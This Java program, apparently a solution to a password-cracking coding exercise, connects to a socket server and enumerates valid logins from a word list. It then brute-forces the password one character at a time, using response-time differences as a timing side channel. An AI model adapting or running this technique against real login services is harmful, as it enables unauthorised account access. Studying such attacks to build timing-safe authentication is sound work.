package hacker;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import java.util.stream.Collectors;


public class Main {
	public static void main(String[] args) {
		try (Socket socket = new Socket(args[0], Integer.parseInt(args[1])); DataInputStream input = new DataInputStream(socket.getInputStream()); DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
			List<String> logins = Files.lines(Paths.get("logins.txt")).collect(Collectors.toList());
			loginAttempt(input, output, logins);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void loginAttempt(DataInputStream input, DataOutputStream output, List<String> logins) throws IOException {
		String password = "0";
		String correctLogin = "";
		for (String login : logins) {
			correctLogin = tryLogin(login, password, input, output);
			if (! correctLogin.isEmpty()) {
				break;
			}
		}
		tryPassword(correctLogin, password, input, output);
	}

	public static String tryLogin(String login, String password, DataInputStream input, DataOutputStream output) throws IOException {
		HashMap<String, String> credentials = new HashMap<>();
		credentials.put("login", login);
		credentials.put("password", password);

		output.writeUTF(String.valueOf(credentials));
		output.flush();
		String jsonString = input.readUTF();
		String result = jsonString.split("\"result\":")[1].split("\"")[1];

		if (result.equals("Wrong password!")) {
			return login;
		} else {
			return "";
		}
	}

	public static void tryPassword(String login, String password, DataInputStream input, DataOutputStream output) throws IOException {
		String result;

		HashMap<String, String> credentials ;
		while (true) {
			credentials = new HashMap<>();
			credentials.put("login", login);
			credentials.put("password", password);

			output.writeUTF(String.valueOf(credentials));
			long timeMessage = System.nanoTime();
			String jsonString = input.readUTF();
			long timeAnswer = System.nanoTime();
			result = jsonString.split("\"result\":")[1].split("\"")[1];
			if (result.equals("Connection success!")) {
				System.out.println(credentials);
				break;
			}
			if (timeAnswer - timeMessage > 50000000) {
				password += 0;
			} else {
				char[] characters = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").toCharArray();
				int index = new String(characters).indexOf(password.charAt(password.length() - 1));
				int nextIndex = (index + 1) % characters.length;
				char nextChar = characters[nextIndex];
				password = password.substring(0, password.length() - 1) + nextChar;
			}
		}
	}
}